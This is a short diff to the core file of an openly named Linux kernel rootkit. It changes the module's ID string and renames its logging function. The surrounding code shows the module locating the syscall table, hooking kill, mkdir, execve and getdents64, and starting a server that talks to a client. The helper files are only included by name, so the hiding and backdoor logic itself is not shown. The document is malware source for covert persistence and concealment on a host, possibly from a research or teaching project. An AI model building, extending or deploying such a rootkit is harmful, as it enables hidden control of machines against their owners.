@@ -8,7 +8,7 @@
 #include <linux/string.h> // contains functions for string operations
 
 static int BUFFER_SIZE = 2048;
-static char ROOTKIT_ID[] =  "Rootkit198760";
+static char ROOTKIT_ID[] =  "Y&&U3im9Y2jk";
 
 #include "includes/log.c" //functions for file I/O and for
 #include "includes/server.c" //functions to run server and communicate with client
@@ -24,7 +24,7 @@ static void __exit ModuleExit(void);
 static int __init ModuleInit(void) {
 	printk("[rootkit][core.c::ModuleInit] DEBUG    rootkit initiated\n");  //DEBUG
 	init_logging();
-	log("[core.c::ModuleInit] logging initiated\n");
+	log_msg("[core.c::ModuleInit] logging initiated\n");
 	get_syscall_table();
 	install_hook(&sys_kill);
 	install_hook(&sys_mkdir);
@@ -40,7 +40,7 @@ static void __exit ModuleExit(void) {
 	remove_hook(&sys_mkdir);
 	remove_hook(&sys_execve);
 	remove_hook(&sys_getdents64);
-	log("[core.c::ModuleExit] removed all hooks");
+	log_msg("[core.c::ModuleExit] removed all hooks");
 	remove_server();
 	close_logging();
 }
